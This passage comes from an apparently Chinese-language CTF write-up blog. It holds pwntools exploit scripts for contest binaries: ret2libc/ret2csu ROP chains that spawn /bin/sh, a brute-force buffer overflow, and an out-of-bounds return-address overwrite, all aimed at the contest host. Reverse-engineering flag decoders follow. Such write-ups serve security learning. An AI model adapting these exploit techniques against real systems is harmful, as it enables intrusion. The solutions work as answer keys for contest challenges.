class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">lic 	= <span class="keyword">lambda</span> data               :uu64(ru(data)[-<span class="number">6</span>:])</span><br><span class="line">padding = <span class="keyword">lambda</span> lenth              :<span class="string">b&#x27;Yhuan&#x27;</span>*(lenth//<span class="number">5</span>)+<span class="string">b&#x27;Y&#x27;</span>*(lenth % <span class="number">5</span>)</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :r.interactive()</span><br><span class="line"></span><br><span class="line">pad = p64(<span class="number">0</span>)*<span class="number">9</span> + p64(<span class="number">1</span>)</span><br><span class="line">backdoor = <span class="string">b&#x27;\x27\xA2&#x27;</span></span><br><span class="line"></span><br><span class="line">pl1 = pad + p64(<span class="number">0</span>) + backdoor</span><br><span class="line">se(pl1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>









<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>libcsearcher</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># sh = process(&#x27;./chal&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31971</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;../../tools/libc-database/db/libc6_2.23-0ubuntu10_amd64.so&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">gadgets1 = <span class="number">0x000000000040132A</span></span><br><span class="line">gadgets2 = <span class="number">0x0000000000401310</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">offset = <span class="string">b&#x27;\0&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">r12,r13,r14,r15,ret_addr</span>):</span><br><span class="line">    payload = offset</span><br><span class="line">    payload += p64(gadgets1)</span><br><span class="line">    <span class="comment"># payload += b&quot;\0&quot;*8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(r12)</span><br><span class="line">    payload += p64(r15)</span><br><span class="line">    payload += p64(r14)</span><br><span class="line">    payload += p64(r13)</span><br><span class="line">    payload += p64(gadgets2) </span><br><span class="line">    payload += <span class="string">b&quot;\0&quot;</span>*<span class="number">56</span></span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"><span class="comment"># sh.recvuntil(&quot;this\n&quot;)</span></span><br><span class="line">csu(<span class="number">1</span>,write_got,<span class="number">8</span>,write_got,main_addr)</span><br><span class="line">write_addr = u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="comment"># offset_addr = write_addr - libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># success(&quot;offset_addr = 0x%x&quot;,offset_addr)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment"># print(&quot;123&quot;+libc.dump(&#x27;str_bin_sh&#x27;))</span></span><br><span class="line"><span class="comment"># system_addr = offset_addr + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># print(&quot;execve:&quot;,hex(system_addr))</span></span><br><span class="line"><span class="comment"># binsh_address = next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="comment"># print(&quot;binsh:&quot;,hex(binsh_address))</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;this\n&quot;</span>)</span><br><span class="line">payload = offset</span><br><span class="line">payload+= p64(<span class="number">0x000000000040101a</span>)<span class="comment">#ret_addr</span></span><br><span class="line">payload+= p64(<span class="number">0x0000000000401333</span>)<span class="comment"># pop_rdi_ret</span></span><br><span class="line">payload+= p64(binsh)</span><br><span class="line">payload+= p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>提供的libc做</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import*</span></span><br><span class="line"><span class="comment"># sh = process(&#x27;./chal&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31971</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;../../tools/libc-database/db/libc6_2.23-0ubuntu10_amd64.so&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">gadgets1 = <span class="number">0x000000000040132A</span></span><br><span class="line">gadgets2 = <span class="number">0x0000000000401310</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">offset = <span class="string">b&#x27;\0&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">r12,r13,r14,r15,ret_addr</span>):</span><br><span class="line">    payload = offset</span><br><span class="line">    payload += p64(gadgets1)</span><br><span class="line">    <span class="comment"># payload += b&quot;\0&quot;*8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(r12)</span><br><span class="line">    payload += p64(r15)</span><br><span class="line">    payload += p64(r14)</span><br><span class="line">    payload += p64(r13)</span><br><span class="line">    payload += p64(gadgets2) </span><br><span class="line">    payload += <span class="string">b&quot;\0&quot;</span>*<span class="number">56</span></span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"><span class="comment"># sh.recvuntil(&quot;this\n&quot;)</span></span><br><span class="line">csu(<span class="number">1</span>,write_got,<span class="number">8</span>,write_got,main_addr)</span><br><span class="line">write_addr = u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">offset_addr = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;offset_addr = 0x%x&quot;</span>,offset_addr)</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;write&#x27;,write_addr)</span></span><br><span class="line"><span class="comment"># base = write_addr - libc.dump(&#x27;write&#x27;)</span></span><br><span class="line"><span class="comment"># system = base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment"># binsh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="comment"># print(&quot;123&quot;+libc.dump(&#x27;str_bin_sh&#x27;))</span></span><br><span class="line">system_addr = offset_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;execve:&quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line">binsh_address = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh:&quot;</span>,<span class="built_in">hex</span>(binsh_address))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;this\n&quot;</span>)</span><br><span class="line">payload = offset</span><br><span class="line">payload+= p64(<span class="number">0x000000000040101a</span>)<span class="comment">#ret_addr</span></span><br><span class="line">payload+= p64(<span class="number">0x0000000000401333</span>)<span class="comment"># pop_rdi_ret</span></span><br><span class="line">payload+= p64(offset_addr+binsh_address)</span><br><span class="line">payload+= p64(system_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./password&#x27;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./password&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31300</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># res = b&#x27;wrong&#x27;</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31300</span>)</span><br><span class="line">    <span class="comment"># p = process(&#x27;./password&#x27;)</span></span><br><span class="line">    pad = <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">    backdoor = p64(<span class="number">0x4012F3</span>)</span><br><span class="line">    pl1 = pad + backdoor</span><br><span class="line">    p.send(pl1)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;password:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    res = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Correct&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># res = b&#x27;wrong&#x27;</span></span><br><span class="line"><span class="comment"># while b&#x27;wrong&#x27; in res:</span></span><br><span class="line"><span class="comment">#     p = process(&#x27;./password&#x27;)</span></span><br><span class="line"><span class="comment">#     pad = b&#x27;a&#x27;*0x20</span></span><br><span class="line"><span class="comment">#     backdoor = p64(0x4012F3)</span></span><br><span class="line"><span class="comment">#     pl1 = pad + backdoor</span></span><br><span class="line"><span class="comment">#     p.sendline(pl1)</span></span><br><span class="line"><span class="comment">#     p.recvuntil(&#x27;password:&#x27;)</span></span><br><span class="line"><span class="comment">#     p.sendline(b&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#     res = p.recvall()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="write1"><a href="#write1" class="headerlink" title="write1"></a>write1</h2><p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/114673240">BUUCTF]PWN——wustctf2020_name_your_cat（数组越界）_pwn ctf 越界写-CSDN博客</a></p>
<p>这个题目和我们做的才差不多，都是通过数据越界然后修改地址，但要注意数组是一个字节一个字节的，这个题目是8个字节8个字节的，所以可以直接使用p64(地址)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(v2 + v1) += tmp;</span><br></pre></td></tr></table></figure>

<p>这个关键的语句，不是&#x3D;，所以不是覆盖，我们要输入数值，然后让这个地址加减数值，让他等于我们的返回地址</p>
<p>我们gdb动调一下，可以看到我们输入下表位41，然后值为-1的时候，他的返回地址从40134D变成了40124D，这就是我们这个的目的，我们要把他变成我们的返回地址</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231029221238038.png" alt="image-20231029221238038"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;chal&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31277</span>)</span><br><span class="line"><span class="comment"># p=gdb.debug(&#x27;./chal&#x27;)</span></span><br><span class="line"><span class="comment"># p=remote(&quot;node3.buuoj.cn&quot;,28477)</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./wustctf2020_name_your_cat&#x27;)</span></span><br><span class="line"><span class="comment"># elf=ELF(&#x27;./wustctf2020_name_your_cat&#x27;)</span></span><br><span class="line"></span><br><span class="line">shell_addr=<span class="number">0x401221</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;aaaaaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="string">b&#x27;41&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;value:&quot;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;value:&quot;</span>,<span class="string">b&#x27;-2b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;</span></span><br><span class="line">a=<span class="built_in">list</span>(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])-<span class="number">7</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="砍树"><a href="#砍树" class="headerlink" title="砍树"></a>砍树</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enc =[</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x17</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>, <span class="number">0x0E</span>, <span class="number">0x36</span>, <span class="number">0x26</span>, <span class="number">0x17</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x07</span>, <span class="number">0x26</span>, <span class="number">0x15</span>, <span class="number">0x52</span>, <span class="number">0x33</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, </span><br><span class="line">  <span class="number">0x3A</span>, <span class="number">0x27</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x33</span>, <span class="number">0x07</span>, <span class="number">0x46</span>, <span class="number">0x17</span>, <span class="number">0x3D</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x3C</span>, <span class="number">0x38</span>, <span class="number">0x2E</span>, <span class="number">0x22</span>, <span class="number">0x18</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;Sycloverforerver&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    enc[i]=enc[i]^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(enc[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(0x1B^ord(&#x27;&#123;&#x27;))</span></span><br></pre></td></tr></table></figure>

<h2 id="听说cpp很难？"><a href="#听说cpp很难？" class="headerlink" title="听说cpp很难？"></a>听说cpp很难？</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">77</span>, <span class="number">95</span>, <span class="number">61</span>, <span class="number">55</span>, <span class="number">104</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">39</span>, <span class="number">104</span>, <span class="number">81</span>, <span class="number">89</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">107</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">85</span>, <span class="number">91</span>, <span class="number">89</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">79</span>, <span class="number">87</span>, <span class="number">120</span>, <span class="number">120</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]=((a[i]+<span class="number">10</span>)^<span class="number">10</span>)-<span class="number">10</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print((71^ 10)-10)</span></span><br></pre></td></tr></table></figure>

<h2 id="rainbow"><a href="#rainbow" class="headerlink" title="rainbow"></a>rainbow</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ida_chars =[</span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x8E</span>, <span class="number">0x50</span>, <span class="number">0x44</span>, <span class="number">0x7B</span>, <span class="number">0x62</span>, <span class="number">0x57</span>, <span class="number">0x4A</span>, </span><br><span class="line">  <span class="number">0x7E</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0x84</span>, <span class="number">0x4F</span>, <span class="number">0x5B</span>, <span class="number">0x95</span>, <span class="number">0x60</span>, </span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0x64</span>, <span class="number">0x77</span>, <span class="number">0x48</span>, <span class="number">0x7D</span>, <span class="number">0x4D</span>, <span class="number">0x7B</span>, <span class="number">0x9F</span>, <span class="number">0x68</span>, <span class="number">0x3C</span>, </span><br><span class="line">  <span class="number">0x2D</span>, <span class="number">0x62</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ida_chars)):</span><br><span class="line">    ida_chars[i]^=i</span><br><span class="line">    <span class="comment"># print(chr(ida_chars[i]),end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># q=1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ida_chars)):</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">3</span>==<span class="number">0</span>):</span><br><span class="line">        ida_chars[i]-=<span class="number">18</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(ida_chars[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="小黄鸭"><a href="#小黄鸭" class="headerlink" title="小黄鸭"></a>小黄鸭</h2><p>直接爆破，有个坑点原题目中</p>
<p>if chr(ord(a[1])) !&#x3D; ‘s’ or ord(a[2]) !&#x3D; 109 or chr(ord(a[17])) !&#x3D; ‘C’:</p>
<p>意思其实就是告诉我们倒数第三个数是m，服了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> a[] = &#123; <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;~&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">int</span> i, j, k;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt; <span 